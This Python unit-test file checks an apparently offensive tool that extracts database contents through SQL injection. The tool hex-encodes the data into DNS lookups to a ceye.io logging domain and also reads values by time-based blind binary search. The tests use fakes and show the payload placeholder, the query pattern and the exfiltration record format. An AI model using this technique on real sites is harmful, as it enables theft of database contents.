import time
import unittest
from unittest import mock

import dnslogsqlinj3 as dsi


class FakeProvider(dsi.Provider):
    def __init__(self, domain, records=None, fail_times=0):
        self._domain = domain
        self.records = list(records or [])
        self.fail_times = fail_times
        self.calls = 0

    def get_domain(self):
        return self._domain

    def get_records(self):
        self.calls += 1
        if self.calls <= self.fail_times:
            raise RuntimeError("platform 502")
        return self.records


class TestParsing(unittest.TestCase):
    def test_hex_chunk_reads_record_between_marker_and_domain(self):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        prov = FakeProvider("dom.ceye.io", ["n1.h000000.414243.dom.ceye.io"])
        ex = dsi.DnsExfil(prov, db, "http://127.0.0.1:1/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1)
        ex.domain = "dom.ceye.io"
        with mock.patch.object(ex, "fire", return_value=0.01):
            self.assertEqual(ex.hex_chunk("(select 1)", 0, 30), b"ABC")

    def test_wait_for_survives_platform_hiccup(self):
        prov = FakeProvider("dom.ceye.io", ["n1.h000000.41.dom.ceye.io"], fail_times=2)
        ex = dsi.DnsExfil(prov, dsi.MySQL(), "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=2, http_timeout=1)
        ex.domain = "dom.ceye.io"
        self.assertEqual(ex.wait_for("n1.h000000"), "n1.h000000.41.dom.ceye.io")


class TestTimeBlind(unittest.TestCase):
    """时间盲注的二分逻辑: 用假时钟验证判定与取值。"""

    def _ex(self, secret):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        ex = dsi.DnsExfil(FakeProvider("dom.ceye.io"), db, "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1,
                          sleep_delay=1.0, samples=2)
        ex.domain = "dom.ceye.io"

        def fake_fire(sql, label):
            # 从 SQL 里解出 pos 和 mid, 判真则返回"睡了"
            import re
            m = re.search(r"ASCII\(SUBSTR\(\(\(.*\)\),(\d+),1\)\)>(\d+)", sql)
            if not m:
                return 0.0
            pos, mid = int(m.group(1)), int(m.group(2))
            hit = secret[pos - 1] > mid
            return 1.05 if hit else 0.02

        ex.fire = fake_fire
        return ex

    def test_binary_search_reads_secret(self):
        secret = b"security"
        ex = self._ex(secret)
        got = b"".join(bytes([ex.time_char("(select database())", p)])
                       for p in range(1, len(secret) + 1))
        self.assertEqual(got, secret)

    def test_time_dump_stops_on_nul(self):
        ex = self._ex(b"ab\x00cd")
        self.assertEqual(ex.time_dump("(select x)", max_len=8), b"ab")


class TestDump(unittest.TestCase):
    def test_multi_chunk_assembly(self):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        value = b"a" * 70
        prov = FakeProvider("dom.ceye.io")
        ex = dsi.DnsExfil(prov, db, "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1)
        ex.domain = "dom.ceye.io"

        def fake_fire(sql, label):
            import re
            m = re.search(r"h(\d{6})", label)
            off = int(m.group(1))
            chunk = value[off:off + 30]
            prov.records = ["n1.h%06d.%s.dom.ceye.io" % (off, chunk.hex())] if chunk else []
            return 0.01

        ex.fire = fake_fire
        self.assertEqual(ex.dump("(select x)", chunk=30, max_bytes=200), value)


if __name__ == "__main__":
    unittest.main()
